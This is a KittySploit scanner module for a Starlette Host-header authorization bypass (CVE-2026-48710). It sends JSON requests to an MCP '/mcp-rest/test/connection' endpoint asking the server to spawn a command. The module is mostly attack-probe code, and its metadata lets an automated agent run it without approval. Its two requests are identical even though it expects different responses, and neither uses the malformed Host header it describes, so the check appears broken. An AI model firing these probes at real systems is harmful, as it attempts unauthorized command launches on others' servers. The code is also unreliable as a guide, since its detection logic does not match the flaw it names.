#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A flaw was found in Starlette, a lightweight ASGI (Asynchronous Server Gateway Interface) framework."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Starlette - Improper Validation of Unsafe Equivalence in Input Detection',
        'description': 'A flaw was found in Starlette, a lightweight ASGI (Asynchronous Server Gateway Interface) framework. A remote attacker could exploit this vulnerability by sending a specially crafted HTTP Host request header. This malformed header could cause the request.url to be incorrectly reconstructed, leading to a discrepancy with the actual requested path. Consequently, security restrictions enforced by middleware and endpoints that rely on request.url for validation could be bypassed, potentially allowing unauthorized access or actions.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'starlette', 'auth-bypass', 'badhost'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-48710',
        ],
        'cve': 'CVE-2026-48710',
    }

    def run(self):
        path = '/mcp-rest/test/connection'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"transport":"stdio","command":"echo","args":["test"]}\n')
        if not r or r.status_code != 401:
            return False
        body = r.text or ""
        body_any = ('auth_error', 'Authentication Error',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/mcp-rest/test/connection'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"transport":"stdio","command":"echo","args":["test"]}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Failed to connect to MCP server', 'status',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Starlette - Improper Validation of Unsafe Equivalence in Input detected', path=path)
            return True
        return False

